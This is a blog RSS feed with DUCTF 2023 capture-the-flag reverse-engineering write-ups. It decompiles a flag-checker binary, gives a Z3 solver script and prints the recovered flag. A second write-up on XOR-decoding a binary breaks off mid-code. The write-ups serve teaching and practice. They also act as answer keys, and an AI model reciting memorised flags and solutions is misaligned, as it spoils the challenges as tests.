<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>ctf write-up on CT</title>
    <link>https://treseco.github.io/tags/ctf-write-up/</link>
    <description>Recent content in ctf write-up on CT</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sun, 03 Sep 2023 19:01:07 -0500</lastBuildDate><atom:link href="https://treseco.github.io/tags/ctf-write-up/index.xml" rel="self" type="application/rss+xml" /><icon>https://treseco.github.io/logo.svg</icon>
    
    
    <item>
      <title>Masked Squares Flag Checker</title>
      <link>https://treseco.github.io/posts/ductf23/masked_squares_flag_checker/</link>
      <pubDate>Sun, 03 Sep 2023 19:01:07 -0500</pubDate>
      
      <guid>https://treseco.github.io/posts/ductf23/masked_squares_flag_checker/</guid>
      <description><![CDATA[<h3 id="masked-squares-flag-checker">Masked Squares Flag Checker</h3>
<ul>
<li>Author: joseph</li>
<li>Category: rev</li>
<li>Difficulty: easy</li>
<li>Points: 218</li>
<li>Solves: 62</li>
</ul>
<hr>
<h4 id="description">Description</h4>
<blockquote>
<p>This program checks the flag based on some simple arithmetic operations.</p>
</blockquote>
<hr>
<h4 id="files">Files</h4>
<p><code>ms_flag_checker</code> - ms_flag_checker: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a8e81b5edf26d75633d7f857771172e81689a563, for GNU/Linux 4.4.0, stripped</p>
<hr>
<h4 id="solve">Solve</h4>
<p>Begin by decompiling main with ghidra and cleaning up the code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> mask_ptr;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>mask_info;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>sum_target_ptr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> masked_sum;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> flag_ints [<span style="color:#ae81ff">36</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf [<span style="color:#ae81ff">40</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//prompt for flag, read in flag
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//convert flag chars to ints and store in flag_ints[36]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  mask_info <span style="color:#f92672">=</span> MASK_INFO_BEGIN;
</span></span><span style="display:flex;"><span>  sum_target_ptr <span style="color:#f92672">=</span> TARGET_SUMS_BEGIN;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    mask_ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_mask</span>((byte <span style="color:#f92672">*</span>)mask_info);
</span></span><span style="display:flex;"><span>    masked_sum <span style="color:#f92672">=</span> <span style="color:#a6e22e">sum_with_mask</span>(flag_ints,mask_ptr);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>sum_target_ptr <span style="color:#f92672">!=</span> masked_sum) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Incorrect!&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    mask_info <span style="color:#f92672">=</span> mask_info[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    sum_target_ptr <span style="color:#f92672">=</span> sum_target_ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (mask_info <span style="color:#f92672">!=</span> (<span style="color:#a6e22e">byte</span> (<span style="color:#f92672">*</span>) [<span style="color:#ae81ff">24</span>])<span style="color:#f92672">&amp;</span>MASK_INFO_END);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Correct!&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The <code>main()</code> function of the binary gives us a clear understanding of what this program does.
We just need to pass the check in every loop iteration. The output of the function we will call <code>sum_with_mask()</code> needs to match some value stored in the program data. We can see what <code>sum_with_mask()</code> does.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sum_with_mask</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>flag_ints,<span style="color:#66d9ef">long</span> mask_ptr) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> idx;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> sum;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> row_end;
</span></span><span style="display:flex;"><span>  row_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>;
</span></span><span style="display:flex;"><span>  sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> row_end <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(mask_ptr <span style="color:#f92672">+</span> idx) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">=</span> sum <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)flag_ints <span style="color:#f92672">+</span> idx);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      idx <span style="color:#f92672">=</span> idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (idx <span style="color:#f92672">!=</span> row_end);
</span></span><span style="display:flex;"><span>    row_end <span style="color:#f92672">=</span> row_end <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (row_end <span style="color:#f92672">!=</span> <span style="color:#ae81ff">168</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> sum;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function simply calculates the sum of all elements of <code>flag_ints</code> where the corresponding element in the mask is non-zero. We know that the return value of this function is what is checked in the flag check, and the desired sum is stored in the program data. Using this information we can get the flag knowing what subsets of flag characters sum to what value. We just need all the different character subsets and with the correct sums. In order to find the character subsets we first need the masks, so we need to look at <code>make_mask()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">make_mask</span>(byte <span style="color:#f92672">*</span>mask_info) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>mask_ptr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iterations;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> offset;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> col;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> row;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> byte_val;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>next_byte;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> byte_lte_0;
</span></span><span style="display:flex;"><span>  byte mask_byte;
</span></span><span style="display:flex;"><span>  mask_ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">144</span>);
</span></span><span style="display:flex;"><span>  mask_byte <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>mask_info;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (mask_byte <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    next_byte <span style="color:#f92672">=</span> mask_info <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    row <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    col <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>      byte_val <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)(<span style="color:#66d9ef">char</span>)mask_byte;
</span></span><span style="display:flex;"><span>      byte_lte_0 <span style="color:#f92672">=</span> byte_val <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (byte_lte_0) {
</span></span><span style="display:flex;"><span>        byte_val <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>byte_val;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      iterations <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      offset <span style="color:#f92672">=</span> col;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>        col <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)mask_ptr <span style="color:#f92672">+</span> ((<span style="color:#66d9ef">long</span>)offset <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)row <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">=</span> (uint)<span style="color:#f92672">!</span>byte_lte_0;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (col <span style="color:#f92672">==</span> <span style="color:#ae81ff">6</span>) {
</span></span><span style="display:flex;"><span>          row <span style="color:#f92672">=</span> row <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          col <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        iterations <span style="color:#f92672">=</span> iterations <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">=</span> col;
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">while</span> (byte_val <span style="color:#f92672">!=</span> iterations);
</span></span><span style="display:flex;"><span>      mask_byte <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>next_byte;
</span></span><span style="display:flex;"><span>      next_byte <span style="color:#f92672">=</span> next_byte <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (mask_byte <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function allocates space for a mask on the heap, then reads each byte from <code>mask_info</code>. Each byte is interpreted as two&rsquo;s complement. The absolute value of the byte determines how many bits to add to the mask. The sign of the byte determines if those bits are 1 or 0, 1 for positive, 0 for negative. Now that we have this figured out, we can get all the masks from the <code>mask_info</code> in the program data. Then we can use Z3 to add each sum as a constraint on the flag and solve.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># data from ghidra @00104060. array of ints that the sum of the flag chars</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># is checked against after being masked.</span>
</span></span><span style="display:flex;"><span>target_sums_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xa1\x05\x00\x00\xfb\x07\x00\x00\xeb\x04\x00\x00\xef\x07\x00\x00\x07\x07\x00\x00\xea\x02\x00\x00\x37\x00\x00\x00\xaa\x05\x00\x00\xcd\x05\x00\x00\x52\x05\x00\x00\x63\x02\x00\x00\x22\x05\x00\x00\x66\x01\x00\x00\x2a\x07\x00\x00\xdc\x05\x00\x00\x4b\x05\x00\x00\xdb\x07\x00\x00\xc6\x07\x00\x00\x93\x07\x00\x00\xc6\x07\x00\x00\x16\x01\x00\x00\x43\x07\x00\x00\x3f\x08\x00\x00\xe6\x05\x00\x00\x78\x03\x00\x00\xc8\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># data from ghidra @001040e0. array of arrays of bytes used to generate masks</span>
</span></span><span style="display:flex;"><span>mask_info <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfb\x01\xfe\x01\xff\x03\xfd\x02\xff\x01\xff\x01\xff\x01\xff\x02\xfd\x02\xfe\x02\x00\x00\x00\x00\xff\x01\xfd\x02\xfd\x02\xff\x01\xfe\x03\xff\x01\xff\x07\xff\x03\xff\x02\x00\x00\x00\x00\x00\x00\xff\x01\xff\x01\xff\x02\xff\x01\xfa\x01\xff\x01\xfe\x01\xff\x01\xff\x01\xfc\x03\xff\x01\xfe\x00\x02\xff\x05\xfd\x03\xff\x04\xff\x02\xff\x05\xfd\x02\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x01\xfd\x01\xff\x01\xfe\x01\xff\x03\xff\x01\xff\x01\xfe\x05\xff\x04\xff\x01\xfd\x00\x00\x00\x01\xfe\x02\xf8\x01\xf9\x02\xff\x01\xfd\x01\xfe\x01\xfc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xeb\x01\xf2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\x03\xfc\x04\xfb\x01\xfe\x01\xff\x01\xfe\x01\xfe\x01\xff\x04\xff\x00\x00\x00\x00\x00\x00\x00\xfc\x05\xfd\x01\xfb\x01\xfd\x01\xfe\x05\xfc\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x02\xfc\x01\xff\x04\xfd\x01\xfc\x01\xff\x02\xff\x01\xfd\x01\xff\x02\xfe\x00\x00\x00\x00\x00\xfe\x01\xf8\x01\xff\x01\xfd\x01\xff\x01\xf9\x01\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xfe\x05\xff\x01\xf8\x03\xfe\x01\xfe\x01\xfd\x01\xfc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfd\x01\xf7\x01\xfe\x01\xef\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xfb\x04\xff\x01\xfe\x01\xff\x02\xfd\x03\xff\x01\xff\x03\xff\x02\xff\x00\x00\x00\x00\x00\x00\xfe\x02\xfd\x01\xff\x01\xff\x01\xff\x01\xf9\x01\xff\x06\xff\x03\xff\x01\xff\x00\x00\x00\x00\x00\x01\xfb\x01\xfe\x02\xff\x02\xff\x01\xff\x01\xfb\x01\xff\x01\xff\x05\xfc\x00\x00\x00\x00\x00\x00\x02\xfd\x01\xfb\x04\xfe\x03\xfe\x05\xff\x02\xff\x02\xff\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x01\xfd\x01\xff\x02\xfe\x01\xff\x07\xfe\x03\xff\x04\xff\x01\xfe\x01\xff\x00\x00\x00\x00\x00\x02\xff\x01\xfe\x02\xff\x02\xfe\x05\xff\x01\xff\x02\xfd\x02\xff\x01\xfe\x02\xff\x01\x00\x00\x00\x01\xfd\x03\xff\x01\xfe\x01\xff\x06\xff\x01\xff\x02\xfe\x01\xff\x01\xff\x03\xff\x02\x00\x00\x00\xf7\x01\xf7\x01\xfb\x01\xf6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xff\x02\xfe\x01\xff\x09\xff\x01\xff\x01\xf9\x02\xfe\x01\xfe\x01\x00\x00\x00\x00\x00\x00\x00\xff\x09\xff\x03\xff\x06\xff\x01\xff\x01\xfe\x01\xfd\x01\xfc\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\x01\xfd\x01\xff\x02\xfb\x06\xff\x02\xfe\x04\xff\x01\xfc\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\x01\xfc\x01\xff\x01\xfe\x01\xfd\x01\xfd\x01\xfd\x03\xfa\x01\xfe\x00\x00\x00\x00\x00\x00\x00\xf8\x04\xfe\x02\xff\x03\xfb\x01\xfe\x02\xff\x01\xfc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># convert bytes to integers</span>
</span></span><span style="display:flex;"><span>target_sums <span style="color:#f92672">=</span> [int<span style="color:#f92672">.</span>from_bytes(target_sums_bytes[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>], <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(target_sums_bytes), <span style="color:#ae81ff">4</span>)]
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># process mask info to generate masks as done in func @00101189</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for each 2&#39;s complement byte in mask info, sign determines 1 or 0 in mask</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># value determines how many 1s or 0s to add to append to the mask</span>
</span></span><span style="display:flex;"><span>masks <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(mask_info), <span style="color:#ae81ff">24</span>):
</span></span><span style="display:flex;"><span>    mask <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(i, i<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>):
</span></span><span style="display:flex;"><span>        signed_val <span style="color:#f92672">=</span> mask_info[j] <span style="color:#f92672">-</span> <span style="color:#ae81ff">256</span> <span style="color:#66d9ef">if</span> mask_info[j] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">128</span> <span style="color:#66d9ef">else</span> mask_info[j]
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> signed_val <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> signed_val <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, abs(signed_val)):
</span></span><span style="display:flex;"><span>                mask<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, abs(signed_val)):
</span></span><span style="display:flex;"><span>                mask<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    masks<span style="color:#f92672">.</span>append(mask)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Solver()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 36 z3 vars, one for each char in the flag input</span>
</span></span><span style="display:flex;"><span>X <span style="color:#f92672">=</span> [ Int(<span style="color:#e6db74">&#39;x</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">36</span>)]
</span></span><span style="display:flex;"><span><span style="color:#75715e"># only int values of printable ascii</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add([ And(X[i] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>, X[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">127</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">36</span>)])
</span></span><span style="display:flex;"><span><span style="color:#75715e"># assume flag prefix</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(X[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#ae81ff">68</span>) <span style="color:#75715e">#D</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(X[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#ae81ff">85</span>) <span style="color:#75715e">#U</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(X[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">==</span><span style="color:#ae81ff">67</span>) <span style="color:#75715e">#C</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(X[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">==</span><span style="color:#ae81ff">84</span>) <span style="color:#75715e">#T</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(X[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">==</span><span style="color:#ae81ff">70</span>) <span style="color:#75715e">#F</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>add(X[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">==</span><span style="color:#ae81ff">123</span>)<span style="color:#75715e">#{</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># add sum constraint for each mask based on required sum in target_sums and </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># summands specified by the mask</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i, m <span style="color:#f92672">in</span> enumerate(masks):
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>add(target_sums[i]<span style="color:#f92672">==</span>Sum([ If(b<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>, X[j], <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">for</span> j , b <span style="color:#f92672">in</span> enumerate(m)]))
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>print(s<span style="color:#f92672">.</span>check())
</span></span><span style="display:flex;"><span>print(s<span style="color:#f92672">.</span>model())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print flag</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> [ s<span style="color:#f92672">.</span>model()<span style="color:#f92672">.</span>evaluate(X[i]) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">36</span>) ] :
</span></span><span style="display:flex;"><span>    print(chr(c<span style="color:#f92672">.</span>as_long()), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>print()
</span></span></code></pre></div><p><code>DUCTF{ezzzpzzz_07bcda7bfe81faf43caa}</code></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>DUCTF solves</title>
      <link>https://treseco.github.io/posts/ductf23/other/</link>
      <pubDate>Sun, 03 Sep 2023 16:05:08 -0500</pubDate>
      
      <guid>https://treseco.github.io/posts/ductf23/other/</guid>
      <description><![CDATA[<h3 id="all-fathers-wisdom">All Fathers Wisdom</h3>
<ul>
<li>Author: Pix</li>
<li>Category: rev</li>
<li>Difficulty: beginner</li>
<li>Points: 100</li>
<li>Solves: 270</li>
</ul>
<hr>
<h4 id="description">Description</h4>
<blockquote>
<p>We found this binary in the backroom, its been marked as &ldquo;The All Fathers Wisdom&rdquo; - See hex for further details. Not sure if its just old and hex should be text, or they mean the literal hex.</p>
<p>Anyway can you get this &lsquo;wisdom&rsquo; out of the binary for us?</p>
</blockquote>
<hr>
<h4 id="files">Files</h4>
<p><code>the-all-fathers-wisdom</code> - ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=01eec917a381d4efe62ed137f1349127f4faeeaa, for GNU/Linux 4.4.0, not stripped</p>
<hr>
<h4 id="solve">Solve</h4>
<p>The given file still includes the function names, so when we decompile it doesn&rsquo;t take long to find the function <code>main.print_flag()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> main.<span style="color:#a6e22e">print_flag</span>(undefined8 flag) {
</span></span><span style="display:flex;"><span>  uint xor_res;
</span></span><span style="display:flex;"><span>  undefined local_228 [<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>  undefined local_218 [<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>  undefined local_208 [<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> i;
</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>end;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> bound;
</span></span><span style="display:flex;"><span>  undefined8 local_1d8;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  undefined8 local_8;
</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>end_ptr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> j;
</span></span><span style="display:flex;"><span>  local_8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x75</span>;
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x26</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	...  
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  local_1d0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x25</span>;
</span></span><span style="display:flex;"><span>  local_1d8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x25</span>;
</span></span><span style="display:flex;"><span>  end <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>local_1d8;
</span></span><span style="display:flex;"><span>  bound <span style="color:#f92672">=</span> <span style="color:#ae81ff">59</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; end_ptr <span style="color:#f92672">=</span> end, j <span style="color:#f92672">=</span> i, i <span style="color:#f92672">&lt;</span> bound; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    runtime.<span style="color:#a6e22e">bounds_check_error</span>();
</span></span><span style="display:flex;"><span>    xor_res <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(end_ptr <span style="color:#f92672">+</span> j) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x11</span>;
</span></span><span style="display:flex;"><span>    local_228 <span style="color:#f92672">=</span> <span style="color:#a6e22e">CONCAT88</span>(<span style="color:#ae81ff">0x4200000000000001</span>,<span style="color:#f92672">&amp;</span>xor_res);
